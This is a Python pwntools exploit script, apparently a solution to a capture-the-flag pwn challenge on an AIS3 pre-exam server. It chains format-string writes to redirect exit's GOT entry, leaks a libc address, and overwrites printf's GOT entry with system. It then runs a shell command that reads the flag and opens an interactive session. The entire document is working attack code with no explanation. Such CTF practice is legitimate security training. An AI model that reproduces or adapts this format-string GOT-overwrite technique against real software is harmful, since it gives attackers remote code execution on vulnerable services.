#!/usr/bin/env python
from pwn import *

context.arch = 'amd64'

l = ELF( './libc-2.27.so' )

host = '60.251.236.18'
host = 'pre-exam-pwn.ais3.org'
y = remote( host , 10003 )

exit_got = 0x601030
printf_got = 0x601018

y.send( '%1768c%8$hn'.ljust( 0x10 , '\0' ) + p64( exit_got ) )
sleep( 0.1 )

y.send( 'AB%7$s'.ljust( 0x8 , '\0' ) + p64( 0x600ff0 ) )

y.recvuntil( 'AB' )
l.address += u64( y.recv(6) + '\0\0' ) - l.sym.__libc_start_main
success( 'libc -> %s' % hex( l.address ) )

info( 'printf -> %s' % hex( l.sym.printf ) )
info( 'system -> %s' % hex( l.sym.system ) )

y.send( '%1768c%8$hn'.ljust( 0x10 , '\0' ) + p64( exit_got ) )
sleep( 0.1 )

a = l.sym.system >> 16 & 0xff
b = l.sym.system & 0xffff

y.send( '%{}c%10$hhn%{}c%11$hn'.format( a , b - a ).ljust( 0x20 , '\0' ) + p64( printf_got + 2 ) + p64( printf_got ) )

y.send( 'cat /home/`whoami`/flag' )


y.interactive()